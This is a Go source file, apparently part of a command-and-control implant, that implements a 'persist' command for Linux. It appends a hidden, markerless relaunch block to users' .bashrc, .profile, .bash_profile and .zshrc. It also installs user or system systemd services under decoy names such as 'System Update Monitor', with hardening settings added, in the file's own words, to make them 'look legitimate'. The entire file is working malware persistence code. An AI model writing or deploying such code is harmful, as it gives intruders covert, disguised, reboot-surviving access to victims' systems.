// server/docker/payloads/Linux/action_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"golang.org/x/sys/unix"
)

// PersistenceCommand handles various persistence mechanisms
type PersistenceCommand struct{}

func (c *PersistenceCommand) Name() string {
	return "persist"
}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: persist <method> [options]",
			ExitCode: 1,
		}
	}

	method := args[0]
	switch method {
	case "bashrc":
		return c.handleBashrcPersistence(args[1:])
	case "systemd":
		return c.handleSystemdPersistence(args[1:])
	case "remove":
		if len(args) < 2 {
			return CommandResult{
				Output:   "Error: specify persistence method to remove",
				ExitCode: 1,
			}
		}
		return c.removePersistence(args[1], args[2:])
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown persistence method: %s", method),
			ExitCode: 1,
		}
	}
}

// handleBashrcPersistence adds backdoor to shell initialization files
func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--user":
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case "--command":
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case "--file":
			if i+1 < len(args) {
				targetFiles = append(targetFiles, args[i+1])
				i++
			}
		case "--files":
			if i+1 < len(args) {
				// Parse comma-separated list
				files := strings.Split(args[i+1], ",")
				for _, f := range files {
					targetFiles = append(targetFiles, strings.TrimSpace(f))
				}
				i++
			}
		}
	}

	// Default to current user
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   fmt.Sprintf("Failed to get current user: %v", err),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	// Default command (current binary path)
	if command == "" {
		execPath, err := os.Readlink("/proc/self/exe")
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath + " &"
	}

	// Get user info
	u, err := user.Lookup(targetUser)
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to lookup user %s: %v", targetUser, err),
			ExitCode: 1,
		}
	}

	// If no files specified, use defaults
	if len(targetFiles) == 0 {
		targetFiles = []string{
			filepath.Join(u.HomeDir, ".bashrc"),
			filepath.Join(u.HomeDir, ".profile"),
			filepath.Join(u.HomeDir, ".bash_profile"),
			filepath.Join(u.HomeDir, ".zshrc"),
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			// Handle relative paths and ~ expansion
			if strings.HasPrefix(file, "~/") {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				// If not absolute, assume it's in user's home
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Backdoor payload without marker
	backdoorPayload := c.generateBashrcPayload(command)

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, fmt.Sprintf("[-] Failed to backdoor %s: %v", file, err))
		} else {
			results = append(results, fmt.Sprintf("[+] Successfully backdoored %s", file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload
func (c *PersistenceCommand) generateBashrcPayload(command string) string {
	// Create payload without marker for better stealth
	payload := fmt.Sprintf(`
if [ -z "$SUDO_COMMAND" ]; then
    if ! pgrep -f "%s" > /dev/null 2>&1; then
        (nohup %s > /dev/null 2>&1 &) 2>/dev/null
    fi
fi`, command, command)

	return payload
}

// injectIntoRCFile adds backdoor to RC file using direct file operations
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	// Check if file exists
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			// Create file if it doesn't exist
			return ioutil.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	// Read existing content
	content, err := ioutil.ReadFile(filepath)
	if err != nil {
		return err
	}

	// Check if command is already in file (avoid duplicates without marker)
	// Extract the command from the payload for checking
	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf("payload already exists in file")
	}

	// Append payload
	newContent := append(content, []byte("\n"+payload)...)

	// Write back with original permissions
	return ioutil.WriteFile(filepath, newContent, info.Mode())
}

// handleSystemdPersistence installs systemd service
func (c *PersistenceCommand) handleSystemdPersistence(args []string) CommandResult {
	var serviceName string
	var userService bool

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--name":
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case "--user":
			userService = true
		}
	}

	// Default service name
	if serviceName == "" {
		serviceName = "system-update"
	}

	// Get current binary path
	execPath, err := os.Readlink("/proc/self/exe")
	if err != nil {
		execPath = os.Args[0]
	}

	if userService {
		return c.installUserSystemdService(serviceName, execPath)
	}
	return c.installSystemSystemdService(serviceName, execPath)
}

// installUserSystemdService creates user-level systemd service
func (c *PersistenceCommand) installUserSystemdService(name string, execPath string) CommandResult {
	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to get current user: %v", err),
			ExitCode: 1,
		}
	}

	// User systemd directory
	systemdDir := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user")

	// Create directory structure
	if err := os.MkdirAll(systemdDir, 0755); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to create systemd directory: %v", err),
			ExitCode: 1,
		}
	}

	// Service file path
	serviceFile := filepath.Join(systemdDir, name+".service")

	// Generate service content
	serviceContent := c.generateSystemdService(name, execPath, true)

	// Write service file
	if err := ioutil.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to write service file: %v", err),
			ExitCode: 1,
		}
	}

	// Enable service using DBus API (if available) or fallback
	if err := c.enableSystemdService(name, true); err != nil {
		// Service created but not auto-enabled
		return CommandResult{
			Output: fmt.Sprintf("[+] Service created at %s\n[-] Auto-enable failed: %v\nManually enable with: systemctl --user enable %s",
				serviceFile, err, name),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   fmt.Sprintf("[+] Successfully installed and enabled user service: %s\n[+] Service file: %s", name, serviceFile),
		ExitCode: 0,
	}
}

// installSystemSystemdService creates system-level systemd service
func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string) CommandResult {
	// System systemd directory
	systemdDir := "/etc/systemd/system"

	// Check if we have write access using unix.Access
	if unix.Access(systemdDir, unix.W_OK) != nil {
		return CommandResult{
			Output:   fmt.Sprintf("No write access to %s. Try with --user flag for user service", systemdDir),
			ExitCode: 1,
		}
	}

	// Service file path
	serviceFile := filepath.Join(systemdDir, name+".service")

	// Generate service content
	serviceContent := c.generateSystemdService(name, execPath, false)

	// Write service file
	if err := ioutil.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to write service file: %v", err),
			ExitCode: 1,
		}
	}

	// Create symlink for multi-user.target.wants to enable on boot
	wantsDir := filepath.Join(systemdDir, "multi-user.target.wants")
	if err := os.MkdirAll(wantsDir, 0755); err == nil {
		linkPath := filepath.Join(wantsDir, name+".service")
		os.Symlink(serviceFile, linkPath)
	}

	return CommandResult{
		Output:   fmt.Sprintf("[+] Successfully installed system service: %s\n[+] Service file: %s", name, serviceFile),
		ExitCode: 0,
	}
}

// generateSystemdService creates systemd service configuration
func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool) string {
	// Generate a plausible looking service
	template := `[Unit]
Description=%s Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=60
ExecStart=%s
StandardOutput=null
StandardError=null

# Security hardening (makes it look legitimate)
PrivateTmp=yes
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/tmp

[Install]
WantedBy=%s
`

	description := "System Update Monitor"
	if userService {
		description = "User Session Manager"
	}

	target := "multi-user.target"
	if userService {
		target = "default.target"
	}

	return fmt.Sprintf(template, description, execPath, target)
}

// enableSystemdService attempts to enable service via systemd
func (c *PersistenceCommand) enableSystemdService(name string, userService bool) error {
	// Try to reload systemd daemon
	if userService {
		// For user services, create a symlink in wants directory
		currentUser, err := user.Current()
		if err != nil {
			return err
		}

		wantsDir := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user", "default.target.wants")
		if err := os.MkdirAll(wantsDir, 0755); err != nil {
			return err
		}

		serviceFile := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user", name+".service")
		linkPath := filepath.Join(wantsDir, name+".service")

		return os.Symlink(serviceFile, linkPath)
	}

	// System service is handled by symlink creation in install function
	return nil
}

// removePersistence removes installed persistence
func (c *PersistenceCommand) removePersistence(method string, args []string) CommandResult {
	switch method {
	case "bashrc":
		return c.removeBashrcPersistence()
	case "systemd":
		var serviceName string
		for i := 0; i < len(args); i++ {
			if args[i] == "--name" && i+1 < len(args) {
				serviceName = args[i+1]
			}
		}
		if serviceName == "" {
			serviceName = "system-update"
		}
		return c.removeSystemdPersistence(serviceName)
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown persistence method: %s", method),
			ExitCode: 1,
		}
	}
}

// removeBashrcPersistence removes backdoors from RC files
func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to get current user: %v", err),
			ExitCode: 1,
		}
	}

	targetFiles := []string{
		filepath.Join(currentUser.HomeDir, ".bashrc"),
		filepath.Join(currentUser.HomeDir, ".profile"),
		filepath.Join(currentUser.HomeDir, ".bash_profile"),
		filepath.Join(currentUser.HomeDir, ".zshrc"),
	}

	var results []string

	for _, file := range targetFiles {
		if err := c.cleanRCFile(file); err != nil {
			if !os.IsNotExist(err) {
				results = append(results, fmt.Sprintf("[-] Failed to clean %s: %v", file, err))
			}
		} else {
			results = append(results, fmt.Sprintf("[+] Cleaned %s", file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanRCFile removes backdoor from RC file
func (c *PersistenceCommand) cleanRCFile(filepath string) error {
	content, err := ioutil.ReadFile(filepath)
	if err != nil {
		return err
	}

	// Split into lines
	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := 0

	for i := 0; i < len(lines); i++ {
		line := lines[i]

		// Look for our backdoor pattern (checking for the if statement structure)
		if strings.Contains(line, `if [ -z "$SUDO_COMMAND" ]; then`) {
			// Found start of our backdoor, skip next 4 lines (the full backdoor block)
			skipNext = 4
			continue
		}

		if skipNext > 0 {
			skipNext--
			continue
		}

		cleanedLines = append(cleanedLines, line)
	}

	// Remove any trailing empty lines we might have added
	for len(cleanedLines) > 0 && cleanedLines[len(cleanedLines)-1] == "" {
		cleanedLines = cleanedLines[:len(cleanedLines)-1]
	}

	// Write back cleaned content
	return ioutil.WriteFile(filepath, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// removeSystemdPersistence removes systemd service
func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult {
	var results []string

	// Try to remove user service
	currentUser, err := user.Current()
	if err == nil {
		userServiceFile := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user", name+".service")
		userLinkPath := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user", "default.target.wants", name+".service")

		if err := os.Remove(userServiceFile); err == nil {
			results = append(results, fmt.Sprintf("[+] Removed user service file: %s", userServiceFile))
		}
		os.Remove(userLinkPath)
	}

	// Try to remove system service (if we have permissions)
	systemServiceFile := filepath.Join("/etc/systemd/system", name+".service")
	systemLinkPath := filepath.Join("/etc/systemd/system", "multi-user.target.wants", name+".service")

	if err := os.Remove(systemServiceFile); err == nil {
		results = append(results, fmt.Sprintf("[+] Removed system service file: %s", systemServiceFile))
	}
	os.Remove(systemLinkPath)

	if len(results) == 0 {
		return CommandResult{
			Output:   fmt.Sprintf("No service found with name: %s", name),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
